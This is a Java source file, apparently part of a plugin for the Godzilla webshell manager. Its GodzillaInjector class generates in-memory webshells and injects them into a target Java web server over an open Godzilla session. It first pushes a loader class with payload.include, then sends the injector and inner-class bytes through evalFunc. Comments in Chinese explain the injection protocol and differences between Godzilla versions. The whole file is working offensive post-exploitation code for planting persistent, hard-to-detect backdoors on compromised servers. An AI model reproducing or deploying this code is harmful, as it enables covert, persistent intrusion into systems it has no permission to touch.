package com.reajason.javaweb.godzilla;

import com.reajason.javaweb.desktop.memshell.model.MemShellFormState;
import com.reajason.javaweb.desktop.memshell.service.GenerationService;
import com.reajason.javaweb.memshell.MemShellResult;
import core.Encoding;
import core.imp.Payload;
import util.http.ReqParameter;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.util.Map;
import java.util.concurrent.Callable;

/**
 * 生成链路与 Godzilla 宿主之间的适配层：生成复用 GUI SDK，注入复用 Godzilla 的
 * {@link Payload#include}/{@link Payload#evalFunc}。
 *
 * <p>注入分两步：先把 {@link B64Runner}（含目标侧装载逻辑，只有 JDK 依赖）include 进目标，
 * 再调用它的 {@code equals(parameterMap)}。Godzilla 的 JavaDynamicPayload 对 include 类固定执行
 * {@code newInstance → equals(parameterMap) → toString}，所以参数通过参数表传入、结果从
 * {@code result} 取回 —— 与参考插件的 B64Runner 协议一致，但这里直接传原始字节，不走 Base64。
 */
public final class GodzillaInjector {

    /**
     * include 时使用的中转类名：4.01 会把它重命名成内置类名池里的名字再下发，4.15 则原样 define、
     * 只把 codeName 当作会话表键。两种行为都依赖同一个键完成 include → evalFunc 的配对。
     */
    public static final String RUNNER_CLASS_NAME = "x.MemShellPartyRunner";

    private static final String RUNNER_RESOURCE = "/com/reajason/javaweb/godzilla/B64Runner.class";
    private static final String PARAM_INNER = "p1";
    private static final String PARAM_MAIN = "p2";
    private static final String PARAM_MAIN_NAME = "p3";

    private static final GenerationService GENERATION_SERVICE = new GenerationService();

    private GodzillaInjector() {
    }

    /**
     * 只生成不打包：注入器字节里已经内嵌了 gzip + Base64 的 shell 类。
     * <p>
     * 生成链路通过 SPI 发现 server/shelltool provider，而 {@code ServiceLoader.load(...)}
     * 用的是线程上下文类加载器。Godzilla 的 EDT 用的是宿主自己的加载器，插件界面在构造
     * SDK frame 时就会加载配置目录，所以 frame 构造同样要走 {@link #callWithPluginClassLoader}，
     * 否则一个 provider 都发现不到。
     */
    public static MemShellResult generate(final MemShellFormState state) {
        return callWithPluginClassLoader(new Callable<MemShellResult>() {
            @Override
            public MemShellResult call() {
                return GENERATION_SERVICE.generateShell(state);
            }
        });
    }

    /**
     * @return 目标注入器返回的可读信息（大部分模板会累积 context 信息）
     * @throws IllegalStateException 下发失败或目标侧注入抛错
     */
    public static String inject(Payload payload, Encoding encoding, MemShellResult result) throws Exception {
        if (payload == null) {
            throw new IllegalStateException("Payload 未初始化，请先打开一个可用的 Godzilla 会话");
        }
        byte[] runnerBytes = readRunnerBytes();
        if (!payload.include(RUNNER_CLASS_NAME, runnerBytes)) {
            throw new IllegalStateException("下发装载器失败（include 返回 false），请确认目标 payload 为 JavaDynamicPayload");
        }

        ReqParameter parameter = new ReqParameter();
        parameter.add(PARAM_INNER, encodeInnerClasses(result.getInjectorInnerClassBytes()));
        parameter.add(PARAM_MAIN, result.getInjectorBytes());
        parameter.add(PARAM_MAIN_NAME, result.getInjectorClassName().getBytes("UTF-8"));

        byte[] response = payload.evalFunc(RUNNER_CLASS_NAME, "run", parameter);
        if (response == null) {
            throw new IllegalStateException("目标没有返回数据");
        }
        String text = decode(encoding, response);
        if (text != null && text.startsWith(B64Runner.ERROR_PREFIX)) {
            throw new IllegalStateException(text.substring(B64Runner.ERROR_PREFIX.length()));
        }
        return text == null ? "" : text.trim();
    }

    private static byte[] readRunnerBytes() throws Exception {
        InputStream in = GodzillaInjector.class.getResourceAsStream(RUNNER_RESOURCE);
        if (in == null) {
            throw new IllegalStateException("插件资源缺失: " + RUNNER_RESOURCE);
        }
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int read;
            while ((read = in.read(buffer)) > 0) {
                out.write(buffer, 0, read);
            }
            return out.toByteArray();
        } finally {
            in.close();
        }
    }

    /**
     * 内嵌类清单编码：int 条目数，随后每条 int 类名长度 + 类名 + int 字节长度 + 字节。
     * 类名必须保持生成时的原值 —— 主注入器里对匿名内部类的引用就是这些名字。
     */
    private static byte[] encodeInnerClasses(Map<String, byte[]> innerClasses) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(buffer);
        int count = innerClasses == null ? 0 : innerClasses.size();
        out.writeInt(count);
        if (count > 0) {
            for (Map.Entry<String, byte[]> entry : innerClasses.entrySet()) {
                byte[] name = entry.getKey().getBytes("UTF-8");
                byte[] bytes = entry.getValue();
                out.writeInt(name.length);
                out.write(name);
                out.writeInt(bytes.length);
                out.write(bytes);
            }
        }
        out.flush();
        return buffer.toByteArray();
    }

    private static String decode(Encoding encoding, byte[] response) {
        if (encoding != null) {
            try {
                String text = encoding.Decoding(response);
                if (text != null) {
                    return text;
                }
            } catch (Throwable ignored) {
                // 宿主编码器不可用时退回 UTF-8，至少把目标返回的报错原文带回来
            }
        }
        try {
            return new String(response, "UTF-8");
        } catch (Exception ignored) {
            return new String(response);
        }
    }

    /**
     * 供插件界面加载配置目录使用：目录构建同样触发 SPI 发现，必须切线程上下文类加载器。
     */
    public static <T> T callWithPluginClassLoader(Callable<T> callable) {
        Thread thread = Thread.currentThread();
        ClassLoader previous = thread.getContextClassLoader();
        thread.setContextClassLoader(GodzillaInjector.class.getClassLoader());
        try {
            return callable.call();
        } catch (RuntimeException e) {
            throw e;
        } catch (Exception e) {
            throw new IllegalStateException(e.getMessage(), e);
        } finally {
            thread.setContextClassLoader(previous);
        }
    }
}
